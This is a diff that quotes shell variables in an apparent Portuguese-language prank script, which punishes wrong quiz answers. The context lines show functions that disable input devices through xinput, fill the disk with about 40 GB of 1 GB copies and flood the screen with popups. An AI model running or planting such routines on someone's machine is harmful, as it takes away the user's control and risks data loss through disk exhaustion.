@@ -45,19 +45,19 @@ perguntar(){
 
 # Description: disables the main mouse inputs
 disable_input_devices(){
-for id in {1..10}; do xinput disable $id; done
+for id in {1..10}; do xinput disable "$id"; done
 }
 
 
 # Description: makes tons of directories and files and expands it 
 dirNfile_generator(){
 	# dir generator
-	for i in {1..490}; do mkdir ~/Desktop/ola$i& done
+	for i in {1..490}; do mkdir ~/Desktop/ola"$i"& done
 
 	# file generator
-	yes uouououououou | head 50000 >> ~/Downloads/yes$i.txt
-	truncate -s 1G ~/Downloads/yes$i.txt
-	for i in {1..40}; do cp ~/Downloads/yes$i.txt ~/Desktop/ola$i/ola$i.txt & done
+	yes uouououououou | head 50000 >> ~/Downloads/yes"$i".txt
+	truncate -s 1G ~/Downloads/yes"$i".txt
+	for i in {1..40}; do cp ~/Downloads/yes"$i".txt ~/Desktop/ola"$i"/ola"$i".txt & done
 }
 
 # Description: first penalty if wrong input in 1st question
@@ -67,7 +67,7 @@ trigger_penalty1(){
 
 	# solução para mover os zenity
 	#for i in {1..50}; do sleep 0.250; wmctrl -r "zenity$i" -e 0,$(($RANDOM % 1920)),$(($RANDOM % 1080)),-1,-1 &
-	 
+
 	for i in {1..50}; do zenity_scattering_error "VoCê ErRoUuUuUuUuUu :(" & done
 	wallpaper_effect_on;
 	for i in {1..60}; do xcowsay_text "ERRAAAAADOOOOO" & done
